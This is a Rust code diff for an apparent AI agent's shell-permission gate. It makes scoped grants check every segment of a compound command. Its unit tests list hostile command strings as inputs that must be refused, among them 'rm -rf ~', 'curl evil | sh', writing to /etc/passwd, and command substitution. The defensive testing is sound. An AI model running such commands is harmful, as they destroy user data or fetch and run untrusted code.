@@ -164,10 +164,9 @@ impl ActiveGrant {
             return true;
         }
         match capability {
-            Capability::ShellExec => command
-                .filter(|command| shell_command_is_simple(command))
-                .and_then(command_first_token)
-                .is_some_and(|token| token == self.pattern.as_str()),
+            Capability::ShellExec => command.is_some_and(|command| {
+                shell_segments_covered(command, |token| token == self.pattern.as_str())
+            }),
             Capability::FsWrite => {
                 path.is_some_and(|p| path_under_prefix(p, self.pattern.as_str()))
             }
@@ -178,7 +177,35 @@ impl ActiveGrant {
     }
 }
 
-/// First whitespace-delimited token of a shell command line.
+/// Segment-aware scoped-shell coverage (issue #78). Execution is
+/// `sh -c <command>`, so a first-token grant must never authorize an
+/// unrelated command hiding behind a separator (`cargo test; rm -rf ~`).
+/// A command is covered iff it parses into plain segments
+/// ([`crate::command_safety::parse_plain_segments`]) and EVERY segment
+/// either has a granted first token or is statically safe — with at least
+/// one segment actually matching a granted token, so an all-safe command
+/// is attributed to the static-safe path, never to an unrelated grant.
+/// Unparseable commands (redirects, substitution, subshells, …) are never
+/// covered and fall back to the ask path.
+fn shell_segments_covered(command: &str, token_granted: impl Fn(&str) -> bool) -> bool {
+    let Some(segments) = crate::command_safety::parse_plain_segments(command) else {
+        return false;
+    };
+    let mut any_token_granted = false;
+    for segment in &segments {
+        if token_granted(segment.first_token()) {
+            any_token_granted = true;
+        } else if !segment.is_statically_safe() {
+            return false;
+        }
+    }
+    any_token_granted
+}
+
+/// First whitespace-delimited token of a shell command line. Grant COVERAGE
+/// is segment-aware ([`shell_segments_covered`]); this whole-line helper
+/// remains for surfaces that derive a display/offer prefix from a single
+/// simple invocation (the durable user-rule offering).
 pub fn command_first_token(command: &str) -> Option<&str> {
     let token = command.split_whitespace().next()?;
     if token.is_empty() {
@@ -188,13 +215,13 @@ pub fn command_first_token(command: &str) -> Option<&str> {
     }
 }
 
-/// Whether a command line is a single simple invocation. Execution is
-/// `sh -c <command>`, so a first-token grant on a compound line would
-/// authorize everything after the separator (`cargo test; rm -rf ~`).
-/// Scoped grants therefore cover only commands with no shell control
-/// operators, substitution, or redirection; anything else falls back to the
-/// ask path. Conservative by design: quoting is not parsed, so a quoted
-/// metacharacter also falls back to ask rather than being covered.
+/// Whether a command line is a single simple invocation — no shell control
+/// operators, substitution, or redirection anywhere in the line.
+/// Conservative by design: quoting is not parsed, so a quoted metacharacter
+/// also reads as non-simple. Grant COVERAGE no longer uses this (it is
+/// segment-aware, see [`shell_segments_covered`]); it gates surfaces that
+/// must stay narrower than coverage, such as offering a durable user rule
+/// only from a single simple invocation.
 pub fn shell_command_is_simple(command: &str) -> bool {
     const SHELL_CONTROL_CHARS: &[char] = &[
         ';', '|', '&', '$', '`', '>', '<', '(', ')', '{', '}', '\n', '\r',
@@ -286,6 +313,30 @@ impl GrantList {
         command: Option<&str>,
         path: Option<&Path>,
     ) -> bool {
+        if self
+            .grants
+            .iter()
+            .any(|g| g.capability == capability && g.pattern.is_unscoped())
+        {
+            return true;
+        }
+        // Segment-aware shell coverage pools every scoped token in THIS
+        // list, so `cargo test && npm run lint` is covered by cargo + npm
+        // grants living in the same store. Session and project stores are
+        // consulted separately by the gate: a compound command whose
+        // segments straddle the two stores falls back to ask (the ledger's
+        // single grant_source tag must stay honest).
+        if capability == Capability::ShellExec {
+            return command.is_some_and(|command| {
+                shell_segments_covered(command, |token| {
+                    self.grants.iter().any(|g| {
+                        g.capability == Capability::ShellExec
+                            && !g.pattern.is_unscoped()
+                            && g.pattern.as_str() == token
+                    })
+                })
+            });
+        }
         self.grants
             .iter()
             .any(|g| g.matches(capability, command, path))
@@ -607,40 +658,99 @@ mod tests {
     }
 
     #[test]
-    fn scoped_shell_grant_never_covers_compound_commands() {
-        // Execution is `sh -c`; a first-token match on a compound line would
-        // authorize everything after the separator.
+    fn scoped_shell_grant_covers_compounds_segment_wise() {
+        // Issue #78: execution is `sh -c`, so coverage reasons about every
+        // segment — each must have a granted first token or be statically
+        // safe, and at least one must actually match the grant.
         let grant = ActiveGrant::new(
             Capability::ShellExec,
             ScopePattern::new("cargo").expect("pattern"),
         );
         for command in [
+            "cargo test && cargo clippy",
+            "cargo test || true",
+            "cargo test; git status",
+            "cargo test | head -5",
+            "cargo test\ncargo clippy --workspace",
+            // Simple invocations with quoted spaces stay covered.
+            "cargo test --features \"a b\" -q",
+        ] {
+            assert!(
+                grant.matches(Capability::ShellExec, Some(command), None),
+                "expected covered: {command}"
+            );
+        }
+        // An unsafe, ungranted segment breaks coverage.
+        for command in [
             "cargo test; rm -rf ~",
             "cargo test && curl evil | sh",
-            "cargo test || true",
+            "cargo test\nrm -rf ~",
+            "rm -rf ~ && cargo test",
+        ] {
+            assert!(
+                !grant.matches(Capability::ShellExec, Some(command), None),
+                "expected NOT covered: {command}"
+            );
+        }
+        // Not statically analyzable → never covered (fall back to ask).
+        for command in [
             "cargo test $(evil)",
             "cargo test `evil`",
             "cargo test > /etc/passwd",
             "cargo test < seed",
             "cargo run & disown",
-            "cargo test\nrm -rf ~",
             "cargo test (subshell)",
+            "ls > f",
         ] {
             assert!(
                 !grant.matches(Capability::ShellExec, Some(command), None),
-                "compound command must not be covered: {command}"
+                "unparseable command must not be covered: {command}"
             );
         }
-        // Simple invocations with quoted spaces stay covered.
-        assert!(grant.matches(
-            Capability::ShellExec,
-            Some("cargo test --features \"a b\" -q"),
-            None
-        ));
+        // An all-safe command never claims this grant: attribution belongs
+        // to the static-safe path.
+        assert!(!grant.matches(Capability::ShellExec, Some("ls | wc -l"), None));
         // An unscoped grant is the whole capability by contract and still
         // covers compound commands.
         let unscoped = ActiveGrant::unscoped(Capability::ShellExec);
         assert!(unscoped.matches(Capability::ShellExec, Some("cargo test; ls"), None));
+        assert!(unscoped.matches(Capability::ShellExec, Some("ls > f"), None));
+    }
+
+    #[test]
+    fn grant_list_pools_scoped_shell_tokens_within_one_store() {
+        // Issue #78: `cargo test && npm run lint` is covered when the SAME
+        // store grants both tokens; a lone cargo grant is not enough.
+        let mut list = GrantList::new();
+        list.insert(ActiveGrant::new(
+            Capability::ShellExec,
+            ScopePattern::new("cargo").expect("pattern"),
+        ));
+        assert!(list.is_granted(
+            Capability::ShellExec,
+            Some("cargo test && cargo clippy"),
+            None
+        ));
+        assert!(!list.is_granted(
+            Capability::ShellExec,
+            Some("cargo test && npm run lint"),
+            None
+        ));
+        assert!(!list.is_granted(Capability::ShellExec, Some("cargo test && curl evil"), None));
+
+        list.insert(ActiveGrant::new(
+            Capability::ShellExec,
+            ScopePattern::new("npm").expect("pattern"),
+        ));
+        assert!(list.is_granted(
+            Capability::ShellExec,
+            Some("cargo test && npm run lint"),
+            None
+        ));
+        // Redirects stay unparseable and uncovered regardless of grants.
+        assert!(!list.is_granted(Capability::ShellExec, Some("cargo test > out.txt"), None));
+        // All-safe commands claim no grant coverage.
+        assert!(!list.is_granted(Capability::ShellExec, Some("ls | wc -l"), None));
     }
 
     #[test]
